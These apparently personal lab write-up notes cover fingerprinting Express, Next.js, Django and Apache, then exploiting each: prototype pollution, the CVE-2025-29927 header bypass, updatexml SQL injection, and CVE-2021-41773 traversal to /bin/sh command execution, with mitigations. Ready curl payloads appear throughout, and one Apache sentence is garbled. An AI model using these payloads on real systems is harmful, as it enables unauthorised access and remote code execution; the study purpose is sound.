# 🚀 Web Security: MERN Stack Analysis & Prototype Pollution

Modern web applications frequently run on the **MERN Stack** (MongoDB, Express.js, React, Node.js). Express.js is a minimal backend framework, meaning developers often write their own helper code to handle tasks. When developers write custom utility functions without security filtering, severe vulnerabilities can appear.

---

## 🕵️ 1. Fingerprinting the Stack (Is it running Express?)

Before trying any exploit, you must confirm the server is running Express. This is called **fingerprinting**. By sending a basic network request (`curl -I`), we check the response headers for specific clues:

### The 3 High-Confidence Signals
1.  **`X-Powered-By: Express`**: This header is sent by Express on every response by default unless explicitly disabled by the developer.
2.  **`connect.sid=s%3A...`**: This unique session cookie name comes from the `express-session` middleware.
3.  **The Unhandled Route Format**: If you request a page that does not exist (like `/nonexistent`), Express natively returns a plain-text HTML error containing: `<pre>Cannot GET /nonexistent</pre>`. This text pattern is unique to Express.
<img width="1563" height="244" alt="image" src="https://github.com/user-attachments/assets/89d43ecd-c387-4127-a53a-198dc80d76c3" />
<img width="1045" height="264" alt="image" src="https://github.com/user-attachments/assets/eb79cb2f-3f93-44fe-8676-4fa699cbc663" />

---

## 🧬 2. Understanding "The Prototype" in JavaScript

To understand how this vulnerability works, you need to know how JavaScript handles object properties.

### What is a Prototype?
In JavaScript, everything inherits features from a shared parent template called **`Object.prototype`**. Think of it like **genetic DNA** for code. 
* If you create a blank user object: `const user = {}`
* Even though `user` is empty, it automatically inherits universal functions (like `.toString()`) from its parent template (`Object.prototype`).

### The Prototype Chain
When Node.js looks for a property on an object (e.g., `user.isAdmin`), it checks two places in order:
1.  **Local Check**: Does this specific `user` object have an `isAdmin` property? If no, it moves to step 2.
2.  **Parent Template Check**: It walks up the "prototype chain" to see if the global parent template (`Object.prototype`) has an `isAdmin` property.

---

## 💥 3. What is Prototype Pollution?

**Prototype Pollution** happens when an attacker injects a malicious property directly into the global parent template (`Object.prototype`). 

Because *every* object in the application inherits from this template, **polluting the parent template changes the behavior of every single object inside the application running in memory [1].**

### The Flaw: Dangerous Object Merging
Applications often have an endpoint (like `/api/user/update`) that lets users update their profile details (name, email). To do this, developers use a custom `merge()` loop function that takes the user's JSON input and copies it key-by-key onto the server's user object.

If the developer forgets to filter out special system keys, an attacker can input a malicious key sequence:
*   **The standard path**: `__proto__` [1]
*   **The filter-bypass path**: `constructor.prototype` [1]

### The Attack Walkthrough (Easy Language)

Imagine the vulnerable backend function looks like this:
```javascript
function merge(target, source) {
  for (let key in source) {
    // Copies everything from the user's input onto the server object
    target[key] = source[key]; 
  }
}
```

1. **The Trap**: The attacker sends a JSON payload to the update profile endpoint:
   ```json
   {
     "__proto__": { "isAdmin": true }
   }
   ```
2. **The Execution**: When the server runs the `merge()` loop, it processes the key `__proto__`. Instead of treating it like a normal text string, JavaScript interprets it as a direct command to open up the global parent template (`Object.prototype`).
3. **The Pollution**: The server accidentally executes: `Object.prototype.isAdmin = true`. The global template is now polluted for the entire runtime of the application.
<img width="1807" height="573" alt="image" src="https://github.com/user-attachments/assets/2fdb2b17-0a0f-483f-9ef9-bcc5d39762b8" />

---

## 🏆 4. Gaining Admin Access (Exploitation)

Once the template is polluted, regular authorization checks will break completely.

Consider this typical code gating an administrative dashboard flag:
```javascript
app.get('/api/admin/flag', (req, res) => {
  const currentUser = req.session.currentUser || {};
  
  if (currentUser.isAdmin) { 
    res.json({ flag: 'THM{PROTOTYPE_POLLUTED}' });
  } else {
    res.status(403).json({ error: 'Not authorized' });
  }
});
```

### Why a Regular User Now Becomes Admin:
1. When a normal, low-privileged user requests the `/api/admin/flag` endpoint, the server looks at `currentUser.isAdmin`.
2. The server checks the local `currentUser` object. It finds **no** `isAdmin` property configured there.
3. Instead of giving up, the engine walks up the prototype chain to check the parent template (`Object.prototype`).
4. It finds the polluted property: `isAdmin: true`.
5. The check evaluates to `true`, and the server returns the flag—granting the attacker administrative access.

---

## 🛡️ 5. Mitigation and Defense

To completely block Prototype Pollution in a MERN stack application, apply these defensive guidelines:

1.  **Sanitize JSON Inputs**: Use input validation libraries like **Joi** or **Zod** to strictly enforce an explicit whitelist of allowed properties. Completely drop any requests containing `__proto__` or `constructor` keys.
2.  **Use Safe Alternatives**: Use modern, secure object utilities like `lodash.merge` (ensure it is updated to a patched version) rather than writing native custom recursive loop functions.
3.  **Create Objects Without Prototypes**: If you are handling sensitive dictionary settings or user states where properties are looked up dynamically, generate objects that do not look up parent templates by using `Object.create(null)` instead of `{}`.
# 🚀 Web Security: Next.js Framework & Middleware Bypass (CVE-2025-29927)

While Express.js serves as a minimal backend layer, **Next.js** builds directly on top of Node.js to create a highly optimized production React framework. However, advanced features like **Middleware** and **React Server Components (RSC)** introduce fresh architectural design flaws that can lead to severe security risks.

---

## 🕵️ 1. Passive Fingerprinting (Is it running Next.js?)

Before testing for critical framework exploits, you must confirm that the target application is running Next.js. We analyze network headers and raw HTML code for specific patterns:

### The 4 High-Confidence Signals
1.  **`X-Powered-By: Next.js`**: This header is automatically attached to responses by the framework.
2.  **`Vary: RSC, Next-Router-State-Tree...`**: The presence of Next.js routing variables inside the `Vary` header is a direct indicator.
3.  **Static Asset Paths**: Check the page source for files loaded from `/_next/static/chunks/`.
4.  **The Window Payload (`window.__next_f`)**: If you view the site's raw HTML source code, you will find a `<script>` tag containing `window.__next_f`. This is the absolute signature of Next.js App Router—it handles the hydration data for React Server Components on the page.

> ⚠️ **Critical Pre-Condition:** The major vulnerabilities in this framework (like CVE-2025-29927 and CVE-2025-55182) **only function in Production Build mode** (`npm run build && npm start`). They do not exist if the developer is running a development test server (`next dev`).

---

## 🛑 2. Understanding Middleware in Next.js

In Next.js, **Middleware** is a specialized function that acts as a gatekeeper. It runs *before* any web page request is fully processed. 

Developers almost universally use Middleware to enforce security, such as:
*   Checking if a user has a valid login session cookie.
*   Redirecting unauthenticated users from `/dashboard` back to the `/login` page.

### The Problem: Infinite Redirection Loops
If Middleware modifies a web request and passes it forward, it can accidentally trigger itself recursively, trapping the web server in an endless processing loop. 

To solve this, Next.js engineered a built-in safety switch: an internal header called **`x-middleware-subrequest`**. When Next.js forwards an internal sub-request, it attaches this header to tell itself: *"Do not run the Middleware verification check on this request again."*

---

## 💥 3. CVE-2025-29927: The Middleware Bypass Flaw

The vulnerability stems from a severe validation oversight: **Next.js trusted the `x-middleware-subrequest` header implicitly, without checking whether it originated from an internal server loop or an external user's browser.**

By manually forging this header onto an external connection, an attacker tells Next.js to completely skip the authentication Middleware check, gaining unauthenticated access to restricted pages.

### The Attack Header Structure
The value of the header must encode the internal path to the application's `middleware.ts` module, **repeated exactly five times**, separated by colons.

*   **Standard Root Setup**:
    ```text
    x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
    ```
*   **Source Folder Setup** (If the project uses a `/src/` directory):
    ```text
    x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
    ```

### Practical Attack Walkthrough

#### Normal State (Secure Gatekeeper)
A normal unauthorized user attempts to view a protected dashboard using `curl`. The Middleware intercepts the request, blocks it, and redirects them to the login form:
```bash
curl -v http://target-app.local
# Output: HTTP/1.1 307 Temporary Redirect -> Location: /login
```

#### Exploit State (Authentication Bypass)
The attacker injects the malicious `x-middleware-subrequest` string into their header parameters. Next.js assumes the request has already been validated internally, drops the authentication guardrails, and renders the private dashboard data:
```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
     http://target-app.local
     
# Output: HTTP/1.1 200 OK
# [Sensitive Dashboard Information Exposed] -> DashboardFlag: THM{MIDDLEWARE_BYPASSED}
```
<img width="1919" height="697" alt="image" src="https://github.com/user-attachments/assets/e5659412-f922-414d-89d6-5569e6db85fb" />


---

## 💣 4. Advanced Threat Context: CVE-2025-55182

While CVE-2025-29927 focuses on bypassing access controls via header manipulation, Next.js environments are also susceptible to **CVE-2025-55182**.

*   **The Flaw**: An unauthenticated **Remote Code Execution (RCE)** vulnerability.
*   **The Cause**: Insecure deserialization within the **RSC Flight protocol**—the binary-like streaming channel that Next.js uses to stream server-rendered React components directly to the client browser.
*   **The Impact**: Carrying a **CVSS 10.0 Critical** rating, attackers can exploit this streaming parser flaw to execute operating system commands (like `whoami` or reverse shells) directly on the hosting server without any credentials.

---

## 🛡️ 5. Remediation and Defense

To secure your Next.js deployments against these critical framework flaws, apply these structural updates immediately:

1.  **Upgrade the Next.js Dependency**: Ensure your application package file points to a patched version of the framework. Update to Next.js versions that validate header origins securely.
2.  **Strip Sensitive Subrequest Headers at the Perimeter**: Configure your front-facing reverse proxy (like Nginx, Cloudflare, or AWS ALBs) to **explicitly scrub or drop** inbound `x-middleware-subrequest` headers arriving from the public internet before they reach the Node.js origin process.
3.  **Implement Defense-in-Depth Authentication**: Do not rely *solely* on a single global Middleware function to protect your data. Ensure your individual data endpoint handlers (`/api/` routes and server components) also perform independent backend session validation checks.
# 🚀 Web Security: Django Architecture & SQL Injection (CVE-2021-35042)

While MERN and Next.js applications run on top of Node.js, **Django** is a robust, Python-native backend framework. It features an automated Object-Relational Mapper (ORM) designed to cleanly isolate application code from raw SQL queries. However, when developers intentionally bypass the ORM to execute raw custom queries, or when older framework versions contain string-parsing flaws, the underlying database becomes wide open to exploitation.

---

## 🕵️ 1. Passive Fingerprinting (Is it running Django?)

Before sending any injection payloads, we monitor standard web responses to confirm Django is running. 

### The 4 High-Confidence Signals
1.  **`Server: WSGIServer/X.X CPython/X.X.X`**: The presence of `WSGIServer` or explicit Python references inside the HTTP server header indicates a Python backend environment.
2.  **`Set-Cookie: csrftoken=...`**: Django generates this specific cookie name natively to manage its cross-site request forgery defense layers.
3.  **Security Headers Combination**: The exact alignment of `X-Frame-Options: DENY` and `X-Content-Type-Options: nosniff` appearing simultaneously reflects default rules applied by Django’s built-in `SecurityMiddleware`.
4.  **`csrfmiddlewaretoken` Hidden Input**: This is the absolute signature. Django's `CsrfViewMiddleware` automatically scans and injects a hidden input field named `csrfmiddlewaretoken` into every single HTML `<form method="POST">` template. 
<img width="1825" height="632" alt="image" src="https://github.com/user-attachments/assets/54533719-cb68-4412-8ba1-315073c39102" />

---

## 💥 2. The Vulnerability: Bypassing the ORM

In this specific scenario, the application provides an `?order=` parameter allowing users to control how products are sorted (e.g., sorting by name or price). 

Instead of letting Django's secure ORM handle the sorting, the developer wrote a custom query string using **Python f-strings (string concatenation)** to directly drop user input into a live SQL query:

```python
# The vulnerable backend view code
order = self.request.GET.get('order', 'name')
sql = (
    'SELECT id, name, price, description FROM products_product '
    f'ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)'
)
```

### The Security Flaw
Because the parameter `{order}` accepts input verbatim, an attacker can append arbitrary SQL clauses. The statement `CASE WHEN (1=1)` is a static truth check that always forces the database engine to execute whatever statement lands inside the `THEN` clause block.

---

## 🧬 3. Word-by-Word Payload Breakdown

The attack utilizes a **Error-Based SQL Injection** technique targeting MySQL databases via the `updatexml()` function.

### The Target Payload Structure:
```sql
updatexml(1, concat(0x7e, (select @@version)), 1)
```
<img width="1755" height="387" alt="image" src="https://github.com/user-attachments/assets/b3417f39-2ea5-4860-8940-197bfceeae4e" />

Let's break down exactly how this function forces the database to leak its secrets word-by-word:

*   **`updatexml(xml_target, xpath_expression, new_xml)`**: A legitimate MySQL utility function used to find a specific tag inside a block of XML data and replace it with new text. It expects 3 distinct arguments.
*   **`1` (First Argument)**: This represents the target XML data. Passing a dummy integer like `1` tells the function to process a blank target space.
*   **`concat(...)` (Second Argument)**: This function combines multiple text strings into a single output string.
*   **`0x7e`**: This is the hexadecimal representation of the tilde character (**`~`**). We inject this symbol at the start of our string to act as a clear visual anchor, making it easy to spot our extracted data inside a wall of text.
*   **`(select @@version)`**: This is the subquery payload. The database executes this statement first. `@@version` is a global MySQL system variable that stores the exact operating system release and database version number.
*   **`1` (Third Argument)**: The replacement value string parameter. Passing a dummy integer completes the mandatory function syntax.

### Why it triggers a data leak:
The `updatexml()` function requires the second argument to be a valid **XPath expression syntax format** (like `/root/user/id`). 

Because our string starts with a tilde (`~8.0.45...`), MySQL recognizes it as a completely invalid XPath format. Instead of failing silently, **MySQL halts execution, throws an explicit syntax error, and prints the invalid string directly back onto the screen**—accidentally exposing the results of our subquery inside the error description.

> ⚠️ **Critical Context Warning:** This explicit error surfacing *only* works if Django's configuration file has **`DEBUG = True`** enabled inside `settings.py`. If a site runs in production mode (`DEBUG = False`), the detailed framework error screens are suppressed, requiring attackers to pivot to **Blind Time-Based Injection** patterns using functions like `SLEEP()`.

---

## 🔍 4. Parsing the Output: Command & Regex Explanation

To cleanly isolate our stolen database data from a messy HTML error page, we pipe the `curl` response directly into a regular expression (`grep`) filter.

### The Command:
```bash
curl -s "http://10.49.150.177:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" | grep -o '~[0-9][^&]*'
```

### Regular Expression (`grep -o '~[0-9][^&]*'`) Breakdown:
*   **`-o`**: Instructs the `grep` tool to output **only the exact matching text segments** that fit the rule pattern, rather than printing the entire messy HTML line string.
*   **`~`**: Tells the filter engine to locate the exact position where our injected tilde character delimiter begins.
*   **`[0-9]`**: Forces the pattern engine to check if the character immediately following the tilde is a standard numeric digit (signaling the start of a version release like `8`).
*   **`[^&]*`**: The `^` symbol inside brackets acts as a negative constraint, meaning *"not this character."* Therefore, `[^&]` means *"match any character that is NOT an ampersand (`&`)."* The trailing asterisk `*` tells it to keep capturing as many of those characters as possible until it reaches an ampersand or a closing HTML tag boundary.

### Real-World Output Examples

#### Example A: Extracting System Versions
```text
# Command execution output:
~8.0.45-0ubuntu0.22.04.1
```
*   **Analysis**: Confirms the target is hosted on an Ubuntu Linux distribution running a **MySQL version 8.0 instance**.

#### Example B: Extracting active Database Names
By swapping the subquery from `@@version` to the native function `database()`, we isolate the exact operational folder context:
```bash
curl -s "http://10.49.150.177:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'
```
```text
# Command execution output:
~vuln_db
```
*   **Analysis**: The backend query is communicating with an internal database table cluster named **`vuln_db`**. This specific path context can be mapped straight into automated utilities like `sqlmap` to perform full database structure dumps.

---

## 🛡️ 5. Remediation and Countermeasures

To safely secure a Django infrastructure deployment against database layer compromises:

1.  **Enforce Strict ORM Usage**: Avoid using `.raw()` methods or building raw custom SQL query string additions using f-strings or variable additions. Stick strictly to Django's native QuerySet API features:
    ```python
    # Secure execution pattern utilizing the safe built-in ORM layer
    products = Product.objects.all().order_by(order)
    ```
2.  **Disable Debug Overlays**: Ensure that **`DEBUG = False`** is explicitly configured inside your production `settings.py` file to block internal system exception logs from being exposed to internet users.
3.  **Keep Framework Dependencies Updated**: If your project requires older legacy version installations, actively trace back known framework code alerts (such as updating to patched releases above Django `3.2.5` to eliminate the underlying root parsing flaws behind CVE-2021-35042).
# 🚀 Web Security: LAMP Stack Analysis & Path Traversal to RCE (CVE-2021-41773)

The **LAMP Stack** (Linux, Apache, MySQL, PHP) is one of the oldest and most widely adopted web architectures on the internet. Because it is highly stable, it powers millions of production websites and legacy systems. However, specific configurations and specific, unpatched software versions can leave the underlying operating system wide open to unauthenticated **Remote Code Execution (RCE)**.

---

## 🕵️ 1. Passive Fingerprinting (Is it running an exposed Apache version?)

Before attempting any exploit, you must look for the distinct signatures that signal an unpatched Apache server.

### The 3 High-Confidence Signals
1.  **`Server: Apache/2.4.49 (Unix)`**: This specific version string in the HTTP headers is an immediate jackpot signal. It is the only version vulnerable to **CVE-2021-41773**.
2.  **The 404 Error Footer**: If you request a path that doesn't exist (like `/nonexistent`), the raw server error message footer will often explicitly repeat the version number.
3.  **`/cgi-bin/` returns a `403 Forbidden`**: Requesting this folder should return a `403 Forbidden` response instead of a `404 Not Found`. This confirms that the folder exists and that **`mod_cgi`** (the tool Apache uses to run server-side scripts) is actively enabled.
<img width="1601" height="612" alt="image" src="https://github.com/user-attachments/assets/ef7cbff0-f456-4806-9408-4a289f1c831d" />
<img width="1542" height="457" alt="image" src="https://github.com/user-attachments/assets/00ff4f96-7454-4a41-b299-227591ffa25b" />

---

## 💥 2. The Vulnerability: Broken Path Normalization

Apache uses an internal function to clean up web paths and block **Directory Traversal** (`../../`) attacks. Normally, if an attacker types `http://target.com`, Apache recognizes the `../` pattern and blocks the request before it touches the server's files.

However, a bug inside Apache version 2.4.49 altered the order of operations: **The security filter checked for bad paths BEFORE fully decoding the URL.**

### The Bypass Logic
*   **The Payload**: Instead of using normal dots (`../`), an attacker types **`.%2e/`** (where `%2e` is the URL-encoded hex value for a literal dot).
*   **The Security Filter**: The server looks at `.%2e/`. Because it is still encoded, the filter fails to recognize it as a directory traversal attempt and safely allows the request to pass.
*   **The OS Layer**: Once it bypasses the filter, Apache decodes `%2e` into a second dot. The operating system receives a literal `../` sequence and walks backward through the server's directories.

---

## 🧬 3. Step-by-Step Payload Breakdown

When directory traversal is combined with an active `/cgi-bin/` directory, the flaw escalates from a simple file-read vulnerability to full **Remote Code Execution (RCE)**.

### The Target Command:
```bash
curl -s --path-as-is "http://10.49.150.177:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --data 'echo Content-Type: text/plain; echo; id'
```

Let's break down exactly how this exploit functions step-by-step:

*   **`--path-as-is`**: **This flag is strictly mandatory.** By default, `curl` will automatically clean up dot sequences on your local machine *before* sending the request. Using `--path-as-is` forces `curl` to stop modifying the path and send the raw `.%2e/` tokens to the target exactly as typed.
*   **`/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh`**: The request enters the authorized `/cgi-bin/` directory. The four repeating `.%2e/` segments break out of the web folder, step all the way up to the Linux root system directory, and point directly to the native system command shell: **`/bin/sh`**.
*   **`--data '...'`**: This flag sends an HTTP POST body to the server. Because the request lands on an executable shell file (`/bin/sh`) inside a CGI folder, Apache executes the shell and pipes whatever text is in the POST data straight into the shell's standard input (`stdin`).
*   **`echo Content-Type: text/plain; echo;`**: This string is required by the official CGI protocol specification. Apache expects any executed script to generate a valid HTTP header block followed by a **blank empty line separator** before sending text back. If you omit this, Apache throws an internal `500 Server Error`.
*   **`id`** (or any system command like `cat /flag.txt`): The actual operating system command you want the target server to execute.
<img width="1735" height="426" alt="image" src="https://github.com/user-attachments/assets/518ea479-fd95-4ec5-8238-d08eec094573" />

---

## 🔄 4. The Sequel: CVE-2021-42013 (Double Encoding)

When Apache developers realized this bug was being actively exploited in the wild, they rushed out a patch in version **2.4.50** to block the `.%2e/` sequence. 

However, they missed a crucial detail: **Double Encoding**. 

Attackers immediately bypassed the patch by encoding the percent sign (`%`) itself into `%25`. This created **CVE-2021-42013**:
*   **The Bypass**: **`%%32%65%%32%65/`**
*   **How it works**: The first decoding pass transforms the string into `.%2e/`. The second decoding pass turns it into a literal `../`, completely bypassing the secondary filter block.

---

## 🛡️ 5. Remediation and Countermeasures

To safely secure a LAMP deployment against path traversal exploits:

1.  **Keep Software Updated**: Ensure you update past Apache version `2.4.51` immediately. Both CVE-2021-41773 and CVE-2021-42013 are completely patched in all subsequent releases.
2.  **Enforce Strict Directory Access Control**: Ensure your Apache configuration files (`httpd.conf` or `apache2.conf`) explicitly enforce a default deny policy across the filesystem root:
    ```apache
    <Directory />
        AllowOverride none
        Require all denied
    </Directory>
    ```
3.  **Disable Unused Modules**: If your application does not explicitly rely on dynamic legacy scripts, completely disable `mod_cgi` and `mod_cgid` to prevent directory traversal bugs from escalating into live command execution.
# 🚀 Web Security: Automated Vulnerability Scanning with Nikto

While manual fingerprinting is essential to understand why specific application signals matter, manually probing dozens of hosts across a massive infrastructure footprint is highly inefficient. **Nikto** is an open-source web server scanner designed to automate the initial reconnaissance phase. It rapidly performs security tests against targets to isolate server software versions, generic misconfigurations, dangerous HTTP options, and hidden configuration headers without requiring any custom manual payloads.

---

## ⚙️ How Nikto Automates Discovery

Nikto operates as a passive-to-light-active web assessment engine. It makes rapid, sequenced HTTP requests to the target port, captures the returning responses, and evaluates the headers against its internal database. 

It excels at identifying:
*   **Software Banners**: Finding explicit version stamps (e.g., `Apache/2.4.49`).
*   **Security Header Discrepancies**: Highlighting missing security protections (e.g., missing `X-Frame-Options` or `Content-Security-Policy`).
*   **Cookie Attributes**: Identifying insecure configurations like session tokens exposed without `HttpOnly` or `Secure` flags.
*   **Dangerous HTTP Methods**: Flagging active methods like `TRACE` or `OPTIONS` that leak backend structures.

---

## 📋 Cross-Stack Automation Analysis

By executing a basic baseline scan query (`nikto -h http://[IP]:[PORT]`), the engine can accurately inventory wildly different underlying backend architectures in under a minute per port.

### 🌐 Port 3000: MERN Stack Analysis
```text
+ Server: No banner retrieved
+ Cookie connect.sid created without the httponly flag
+ Retrieved x-powered-by header: Express
```
*   **The Automated Signals**: Node.js/Express environments do not emit a standard `Server:` software banner string by default. Nikto instead flags the framework by intercepting the `x-powered-by: Express` header and identifying the signature `connect.sid` cookie value structure.
*   **Bonus Risk Finding**: It alerts that the session token lacks the `HttpOnly` security attribute, signaling that the application is vulnerable to session theft via Cross-Site Scripting (XSS).

### ⚡ Port 3001: Next.js Stack Analysis
```text
+ Server: No banner retrieved
+ Retrieved x-powered-by header: Next.js
+ Uncommon header 'x-nextjs-stale-time' found
+ Uncommon header 'x-nextjs-cache' found: HIT
```
*   **The Automated Signals**: Like Express, it lacks a default `Server:` banner. It isolates the stack through the explicit `X-Powered-By: Next.js` header. 
*   **Exploitation Context**: The discovery of custom caching/prerendering headers (`x-nextjs-cache`) provides instant confirmation that the target is operating in an optimized **Production Build** configuration—the exact prerequisite environment required to execute the critical **CVE-2025-29927** middleware authentication bypass.

### 🐍 Port 8000: Django Stack Analysis
```text
+ Server: WSGIServer/0.2 CPython/3.10.12
+ Uncommon header 'referrer-policy' found, with contents: same-origin
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
```
*   **The Automated Signals**: Nikto extracts a highly specific python signature banner: `WSGIServer/0.2 CPython`. 
*   **Exploitation Context**: The automated capturing of standardized default privacy options (`nosniff`, `same-origin`) confirms that Django's global defensive component, `SecurityMiddleware`, is actively processing inbound requests.

### 🦅 Port 8080: LAMP Stack (Apache) Analysis
```text
+ Server: Apache/2.4.49 (Unix)
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
```
*   **The Automated Signals**: This response provides the highest security value. Nikto catches the raw, unredacted version string `Apache/2.4.49`. 
*   **Exploitation Context**: No deep application path fuzzing or trial-and-error configuration debugging is required. The version text mapping immediately signals the presence of **CVE-2021-41773**, giving attackers a direct path to execute unauthenticated remote operating system commands via path traversal.

---

## 🧠 The Automation Trade-Off: Tool Limitations

While tools like Nikto are highly effective for rapid environment profiling and version identification, security engineers must realize where automation stops:

*   **Infrastructure-Level Visibility vs. Application Logic**: Nikto is excellent at inspecting network properties, HTTP configurations, and static file locations. However, it cannot comprehend customized, deep application code architecture.
*   **Custom Flaw Limitations**: Nikto contains zero automated templates to trace complex, customized application logic flaws like JavaScript **Prototype Pollution** (MERN) or raw string variable concatenation inside server-side database loops (**SQL Injection** in Django). 
*   **The Triage Philosophy**: Automation should be utilized exclusively as a **first-pass triage mechanism** to quickly profile the technology footprint and discover low-hanging misconfigurations across a wide scope. Once the stack identity is confirmed, security practitioners must pivot back to targeted, manual assessment methodologies to uncover deeper application flaws.

---

## 🛡️ Remediation and Automated Scan Defense

Automated scanners like Nikto are highly aggressive, making thousands of noise-heavy requests that can easily saturate application event logs. You can defend your stack using these mitigation steps:

1.  **Obfuscate Server Banner Headers**: Modify your web server settings to completely scrub or minimize software strings to block scanners from mapping out versions:
    ```apache
    # In Apache configuration files (httpd.conf)
    ServerTokens ProductOnly
    ServerSignature Off
    ```
2.  **Strip Framework Identifiers**: Explicitly disable or hide framework tracking markers to make passive mapping significantly harder:
    ```javascript
    // In Express applications to eliminate the x-powered-by header
    app.disable('x-powered-by');
    ```
3.  **Implement Rate Limiting & Threat Blocking**: Deploy an inline Web Application Firewall (WAF) to track browser traffic metadata. Scanners like Nikto default to a recognizable static **User-Agent header string** (`User-Agent: Mozilla/5.0 ... Nikto/X.XX`). Firewalls can be configured to drop these traffic streams instantly.
